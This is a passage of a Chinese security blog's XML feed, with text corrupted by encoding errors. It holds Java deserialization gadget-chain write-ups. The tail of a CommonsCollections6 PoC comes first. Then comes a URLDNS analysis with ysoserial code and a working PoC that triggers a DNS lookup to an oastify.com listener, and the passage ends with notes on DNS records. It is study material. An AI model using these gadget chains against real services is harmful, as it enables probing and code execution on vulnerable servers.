class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serial(hashMap);</span><br><span class="line">        unserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS</title>
      <link href="/2025/03/23/URLDNS/"/>
      <url>/2025/03/23/URLDNS/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS-é“¾å­åˆ†æ"><a href="#URLDNS-é“¾å­åˆ†æ" class="headerlink" title="URLDNS é“¾å­åˆ†æ"></a>URLDNS é“¾å­åˆ†æ</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p><code>java.util.HashMap</code> é‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ <code>java.net.URL</code> çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</p><p>åœ¨åˆ©ç”¨ysoç”Ÿæˆé“¾å­çš„æ—¶å€™å…ˆä»GeneratPayload.classè§¦å‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INTERNAL_ERROR_CODE</span> <span class="operator">=</span> <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">USAGE_CODE</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GeneratePayload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">        <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">                <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">                Serializer.serialize(object, out);</span><br><span class="line">                Utils.releasePayload(payload, object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.exit(<span class="number">70</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>ç„¶åaddæ·»åŠ ä¹‹åï¼Œè°ƒç”¨æ–°å®ä¾‹åŒ–å¯¹è±¡çš„getObjectæ–¹æ³•,åé¢è°ƒè¯•è·³åˆ°äº†URLDNS.javaï¼Œä¸”å®ç°äº†ObjectPayloadæ¥å£ï¼Œé‡Œé¢ä¹Ÿç¡®å®æœ‰getObjectæ–¹æ³•ï¼š</p><p>é‡ç‚¹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›URLStreamHandleråä¸ºhandlerçš„å®ä¾‹SilentURLStreamHandler()</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›HashMapåä¸ºhtçš„å®ä¾‹HashMap()</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>((URL)<span class="literal">null</span>, url, handler);<span class="comment">//åˆ›å»ºä¸€ä¸ªè¿”å›URLåå­—ä¸ºuçš„å®åŠ›URL,å¹¶ä¸”ä½¿ç”¨æŒ‡å®šæ„é€ å‡½æ•°URL(URL context, String spec, URLStreamHandler handler)</span></span><br><span class="line">ht.put(u, url);<span class="comment">//è¿™ä¸€è¡Œå°† URL å¯¹è±¡ u å’Œå¯¹åº”çš„ url å­—ç¬¦ä¸²å­˜å…¥ HashMap ht</span></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);<span class="comment">//è¿™ä¸€è¡Œé€šè¿‡åå°„æœºåˆ¶å°† URL å¯¹è±¡ u çš„ hashCode å­—æ®µå€¼è®¾ç½®ä¸º -1ï¼ˆå› ä¸º -1 é€šå¸¸è¡¨ç¤ºæœªåˆå§‹åŒ–çš„çŠ¶æ€ï¼‰</span></span><br><span class="line"><span class="keyword">return</span> ht;<span class="comment">//è¿”å›å€¼ht</span></span><br></pre></td></tr></table></figure><p>URLStreamHandler æ˜¯ Java ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç”¨äºå¤„ç† URL çš„åè®®éƒ¨åˆ†ï¼Œä¾‹å¦‚ HTTPã€HTTPSã€FTP ç­‰ã€‚</p><p>HashMap æ˜¯ Java ä¸­çš„ä¸€ç§é›†åˆç±»ï¼Œå±äº java.util åŒ…ï¼Œç”¨äºå­˜å‚¨é”®å€¼å¯¹ï¼ˆkey-value pairsï¼‰ã€‚</p><p>åœ¨è¿™é‡Œï¼Œht æ˜¯ä¸€ä¸ªç©ºçš„ HashMapï¼Œåç»­å°†è¢«ç”¨æ¥å­˜å‚¨ URL å¯¹è±¡å’Œå¯¹åº”çš„ URL å­—ç¬¦ä¸²ã€‚</p><p>Reflections å¯èƒ½æ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼ˆä¾‹å¦‚æ¥è‡ªæŸä¸ªåº“ï¼Œå¦‚ org.reflectionsï¼‰ï¼Œç”¨äºç®€åŒ– Java åå°„æ“ä½œã€‚å®ƒçš„ setFieldValue æ–¹æ³•é€šè¿‡åå°„ä¿®æ”¹å¯¹è±¡çš„å­—æ®µå€¼ã€‚</p><p>åœ¨ Java çš„ URL ç±»ä¸­ï¼ŒhashCode æ˜¯ä¸€ä¸ªç§æœ‰å­—æ®µï¼Œç”¨äºç¼“å­˜è¯¥ URL çš„å“ˆå¸Œç ã€‚URL ç±»çš„ hashCode() æ–¹æ³•ä¼šè®¡ç®—å¹¶ç¼“å­˜è¿™ä¸ªå€¼ï¼Œä»¥ä¾¿åœ¨é›†åˆæ“ä½œï¼ˆå¦‚ HashMap çš„é”®æ¯”è¾ƒï¼‰ä¸­å¿«é€Ÿä½¿ç”¨ã€‚</p><p>å°† hashCode è®¾ç½®ä¸º -1 çš„ç›®çš„å¯èƒ½æ˜¯ï¼š</p><ul><li>å¼ºåˆ¶ URL å¯¹è±¡åœ¨ä¸‹æ¬¡è°ƒç”¨ hashCode() æ—¶é‡æ–°è®¡ç®—å“ˆå¸Œç ï¼ˆå› ä¸º -1 é€šå¸¸è¡¨ç¤ºæœªåˆå§‹åŒ–çš„çŠ¶æ€ï¼‰ã€‚</li></ul><p>hashcodeè®¡ç®—ï¼Œåˆ¤æ–­å¦‚æœä¸æ˜¯-1ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œè¡¨ç¤ºå·²ç»ç®—è¿‡äº†ï¼Œæ˜¯-1åˆ™ç»§ç»­è®¡ç®—ï¼›è¿˜æœ‰éœ€è¦æ³¨æ„çš„è¿™ä¸ªæ¥å£ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//è¿™ä¸ªURLä¼ è¾“å®ç°ç±»æ˜¯ä¸€ä¸ªtransientä¸´æ—¶ç±»å‹ï¼Œå®ƒä¸ä¼šè¢«ååºåˆ—åŒ– </span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">//hashCodeæ˜¯privateç±»å‹ï¼Œéœ€è¦æ‰‹åŠ¨å¼€æ”¾æ§åˆ¶æƒæ‰å¯ä»¥ä¿®æ”¹ã€‚</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨HashMapçš„putæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šé€šè¿‡hashå‡½æ•°è°ƒç”¨<code>key.hashCode()</code>è®¡ç®—keyçš„hashCode;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyæ˜¯ä¼ å…¥çš„URLå¯¹è±¡ï¼Œæœ€ç»ˆè°ƒç”¨URLå¯¹è±¡çš„hashCodeå‡½æ•°ï¼Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>handler</code>æ˜¯<code>URLStreamHandler</code>çš„å¯¹è±¡ï¼›handleråœ¨æ„é€ å‡½æ•°æ—¶è¢«èµ‹å€¼äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler</span><br></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨äº†<code>URLStreamHandler.hashCode</code>ä¸­çš„<code>getHostAddress(u)</code>æ–¹æ³•å¯¼è‡´DNSè§£æ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">    h += addr.hashCode();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">        h += host.toLowerCase().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">2</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢åœ¨putæ—¶å°±å‘èµ·DNSè¯·æ±‚ï¼Œå°†hashCodeçš„é»˜è®¤å€¼-1æ”¹æ‰ï¼Œæ‰§è¡Œä¸äº†handler.hashCode(this)</span></span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ </p><p>å½¢è±¡çš„ä¸¾ä¸ªä¾‹å­</p><h3 id="åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰"><a href="#åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰" class="headerlink" title="åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰"></a><strong>åŸ‹é›·ï¼šæ„é€ ä¸€ä¸ªå¸¦â€œé™·é˜±â€çš„å¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰</strong></h3><ul><li><strong>é™·é˜±æ ¸å¿ƒ</strong>ï¼šæŠŠURLå¯¹è±¡ï¼ˆæ¯”å¦‚<code>http://xxx.dnslog.cn</code>ï¼‰å¡è¿›HashMapé‡Œå½“â€œé’¥åŒ™â€ï¼ˆKeyï¼‰ï¼Œç„¶ååºåˆ—åŒ–è¿™ä¸ªHashMapã€‚</li></ul><p><strong>é˜²æ­¢æå‰è§¦å‘</strong>ï¼šURLå¯¹è±¡é»˜è®¤ä¼šç«‹å³æŸ¥DNSï¼Œä½†é»‘å®¢ç”¨åå°„ä¿®æ”¹<code>hashCode</code>å±æ€§ä¸º123ï¼ˆä¸´æ—¶å€¼ï¼‰ï¼Œé¿å…åºåˆ—åŒ–æ—¶è§¦å‘DNS</p><h3 id="å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰"><a href="#å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰" class="headerlink" title="å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰"></a><strong>å¯„å¿«é€’ï¼šå‘é€åŒ…è£¹åˆ°ç›®æ ‡ï¼ˆä¼ è¾“æ•°æ®ï¼‰</strong></h3><ul><li><strong>æ•°æ®ä¼ªè£…</strong>ï¼šåºåˆ—åŒ–åçš„HashMapçœ‹èµ·æ¥æ˜¯æ™®é€šæ•°æ®ï¼Œè¢«å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆæ¯”å¦‚é€šè¿‡æ¥å£ã€æ–‡ä»¶ä¸Šä¼ ç­‰é€”å¾„ï¼‰ã€‚</li></ul><h3 id="æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰"></a><strong>æ‹†å¿«é€’ï¼šç›®æ ‡æ‹†åŒ…è£¹è§¦å‘é™·é˜±ï¼ˆååºåˆ—åŒ–ï¼‰</strong></h3><p><strong>è‡ªåŠ¨æ‹†åŒ…</strong>ï¼šæœåŠ¡å™¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨HashMapçš„<code>readObject</code>æ–¹æ³•ï¼Œè¿™æ˜¯Javaé»˜è®¤çš„ååºåˆ—åŒ–é€»è¾‘ã€‚</p><p><strong>è®¡ç®—â€œé’¥åŒ™â€å“ˆå¸Œå€¼</strong>ï¼š</p><p>HashMapä¼šé‡æ–°è®¡ç®—æ¯ä¸ªKeyçš„å“ˆå¸Œå€¼ï¼ˆ<code>hash(key)</code>ï¼‰</p><ul><li>æ­¤æ—¶Keyæ˜¯ä¹‹å‰åŸ‹å…¥çš„URLå¯¹è±¡ï¼Œäºæ˜¯è°ƒç”¨URLçš„<code>hashCode()</code>æ–¹æ³•ã€‚</li></ul><h3 id="æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰"><a href="#æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰" class="headerlink" title="æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰"></a><strong>æŸ¥åœ°å€ï¼šè§¦å‘DNSè¯·æ±‚ï¼ˆæ ¸å¿ƒåˆ©ç”¨ï¼‰</strong></h3><p><strong>URLçš„é™·é˜±é€»è¾‘</strong></p><p>URLçš„<code>hashCode</code>å‘ç°è‡ªå·±çš„<code>hashCode</code>æ˜¯-1ï¼ˆåå°„æ”¹å›çš„åˆå§‹å€¼ï¼‰ï¼Œäºæ˜¯è°ƒç”¨<code>URLStreamHandler.hashCode()</code></p><p>è¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šè§£æURLçš„ä¸»æœºåï¼ˆå¦‚<code>xxx.dnslog.cn</code>ï¼‰ï¼Œè°ƒç”¨<code>InetAddress.getByName()</code>å‘èµ·DNSæŸ¥è¯¢</p><p><strong>ç»“æœåé¦ˆ</strong>ï¼šDNSæŸ¥è¯¢è®°å½•ä¼šè¢«æ”»å‡»è€…çš„ç›‘æ§å¹³å°ï¼ˆå¦‚DNSLogï¼‰æ•è·ï¼Œè¯æ˜ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘ç©¿é€åˆæ¢</title>
      <link href="/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/"/>
      <url>/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>å­¦ä¹ ä¸€ä¸‹ç½‘ç»œçŸ¥è¯†</p><p>ä¸»è¦å­¦ä¹ ä¸‹DNS,å› ä¸ºåœ¨åç»­çš„å†…ç½‘æ¸—é€ä¸åº”æ€¥æ„Ÿè§‰ç”¨çš„ä¼šæ¯”è¾ƒå¤š</p><p>DNSè§£ææµç¨‹æœ‰ä¸ªå¤§è‡´çš„äº†è§£ è¿™é‡Œå°±ä¸ä¸€ä¸€ç»†è°ˆäº†ä¸»è¦è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹åŸŸåè§£æè®°å½•</p><h2 id="åŸŸåè§£æè®°å½•"><a href="#åŸŸåè§£æè®°å½•" class="headerlink" title="åŸŸåè§£æè®°å½•"></a>åŸŸåè§£æè®°å½•</h2><h3 id="Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰"><a href="#Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰" class="headerlink" title="Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰****"></a><strong>Aè®°å½•</strong>ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰****</h3><p>ä»£è¡¨Addressï¼Œç”¨æ¥æŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå¦‚å°†item.taobao.comæŒ‡å®šåˆ°115.238.23.xxxï¼Œå°†switch.taobao.comæŒ‡å®šåˆ°121.14.24.xxxã€‚<strong>A****è®°å½•å¯ä»¥å°†å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPåœ°å€ï¼Œä½†æ˜¯ä¸èƒ½å°†ä¸€ä¸ªåŸŸåè§£æåˆ°å¤šä¸ªIPåœ°å€</strong></p><p><em>ä¾‹å­</em>ï¼š<code>item.taobao.com</code>æŒ‡å‘<code>115.238.23.xxx</code>ï¼Œç›¸å½“äºå‘Šè¯‰å¿«é€’å‘˜â€œæ·˜å®å•†å“é¡µçš„å¿«é€’é€åˆ°è¿™ä¸ªåœ°å€â€</p><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>ä¸€ä¸ªåŸŸååªèƒ½å¯¹åº”ä¸€ä¸ªIPï¼Œä½†å¤šä¸ªåŸŸåå¯ä»¥æŒ‡å‘åŒä¸€ä¸ªIPï¼ˆæ¯”å¦‚æ·˜å®çš„å¤šä¸ªå­é¡µé¢å…±ç”¨æœåŠ¡å™¨ï¼‰</li><li>å¦‚æœæœåŠ¡å™¨æ¬å®¶ï¼ˆæ¢IPï¼‰ï¼Œå¾—æ‰‹åŠ¨æ”¹åœ°å€ç°¿</li></ul><h3 id="MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰"><a href="#MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰" class="headerlink" title="MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰"></a><strong>MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰</strong></h3><p>Mail Exchangeï¼Œå°±æ˜¯å¯ä»¥å°†æŸä¸ªåŸŸåä¸‹çš„é‚®ä»¶æœåŠ¡å™¨æŒ‡å‘è‡ªå·±çš„Mail Serverï¼Œå¦‚taobao.comåŸŸåçš„Aè®°å½•IPåœ°å€æ˜¯115.238.25.xxxï¼Œå¦‚æœå°†MXè®°å½•è®¾ç½®ä¸º115.238.25.xxxï¼Œå³<a href="mailto:&#x78;&#x78;&#x78;&#x40;&#x74;&#x61;&#111;&#x62;&#97;&#x6f;&#x2e;&#99;&#111;&#109;">&#x78;&#x78;&#x78;&#x40;&#x74;&#x61;&#111;&#x62;&#97;&#x6f;&#x2e;&#99;&#111;&#109;</a>çš„é‚®ä»¶è·¯ç”±ï¼ŒDNSä¼šå°†é‚®ä»¶å‘é€åˆ°115.238.25.xxxæ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè€Œæ­£å¸¸é€šè¿‡Webè¯·æ±‚çš„è¯ä»ç„¶è§£æåˆ°Aè®°å½•çš„IPåœ°å€<br><strong>åŠŸèƒ½</strong>ï¼šä¸“é—¨ç®¡é‚®ä»¶çš„â€œå¿«é€’è·¯çº¿â€ã€‚å‘Šè¯‰åˆ«äººå‘åˆ°ä½ 